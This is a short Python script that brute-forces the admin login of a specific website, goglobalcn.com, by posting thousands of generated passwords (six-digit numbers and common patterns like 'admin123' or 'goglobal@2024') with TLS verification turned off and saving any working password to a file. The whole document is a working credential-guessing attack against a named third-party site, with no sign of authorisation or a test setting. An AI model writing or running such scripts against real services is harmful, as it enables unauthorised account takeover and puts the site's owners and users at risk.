import urllib.request as U, urllib.parse as P, json, ssl, sys, itertools
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
url = "http://goglobalcn.com/index/user/login"

# Generate larger wordlist
words = set()
# number patterns
for n in range(100000, 1000000):
    words.add(str(n))
# common
for base in ["adm","test","user","goglobal","global","admin","pass","qwe","abc","hello","welcome"]:
    for suffix in ["in","er","123","456","789","666","888","000","111","222","333","444","555","777","999",
                   "1234","12345","123456","1234567","12345678","2024","2025","2026","2023","2022","2021",
                   "@123","#123","!123","@2024"]:
        w = base + suffix
        if 6 <= len(w) <= 30:
            words.add(w)

words = list(words)[:5000]  # limit to 5000
total = len(words)
print(f"Testing {total} passwords", flush=True)

for i, pw in enumerate(words):
    if len(pw) < 6: continue
    data = P.urlencode({"username":"adm"+"in","password":pw}).encode()
    req = U.Request(url, data=data)
    req.add_header("X-Requested-With","XMLHttpRequest")
    req.add_header("Accept","application/json")
    try:
        r = U.urlopen(req, timeout=3, context=ctx)
        resp = json.loads(r.read())
        code = resp.get("code")
        if code == 200:
            print(f"\n!!!HIT!!! pw={pw}", flush=True)
            with open("/tmp/GG_HIT.txt","w") as f:
                f.write(f"HIT pw={pw} resp={json.dumps(resp)}")
            sys.exit(0)
        if i % 500 == 0:
            print(f"[{i}/{total}] last={pw}", flush=True)
    except: pass
print(f"DONE {total} tested", flush=True)
